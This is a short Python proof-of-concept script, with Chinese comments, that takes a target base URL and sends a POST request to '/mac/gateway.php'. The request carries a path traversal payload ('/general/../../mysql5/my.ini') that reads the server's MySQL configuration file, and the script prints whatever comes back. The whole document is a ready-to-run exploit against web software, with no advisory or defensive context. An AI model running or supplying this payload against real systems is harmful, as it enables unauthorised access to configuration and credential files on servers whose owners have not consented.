import argparse
import requests


def run_poc(base_url):
    # 在固定的基础URL上构造目标URL
    target_url = base_url + "/mac/gateway.php"

    # 构造请求头
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Encoding": "gzip"
    }

    # 构造POST数据，这里是路径遍历的示例
    data = {
        "json": '{"url":"/general/../../mysql5/my.ini"}'
    }

    try:
        # 发送POST请求
        response = requests.post(target_url, headers=headers, data=data)

        # 输出HTTP响应代码
        print("HTTP响应代码:", response.status_code)

        # 输出响应内容
        print("响应内容:")
        print(response.text)

        # 如果响应中包含敏感信息，可以进一步分析
        # 如果响应中包含目标系统的敏感文件内容，说明存在路径遍历漏洞
    except Exception as e:
        print("发生异常:", str(e))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Path Traversal POC")
    parser.add_argument("-u", "--url", help="Base URL", required=True)
    args = parser.parse_args()

    base_url = args.url
    run_poc(base_url)
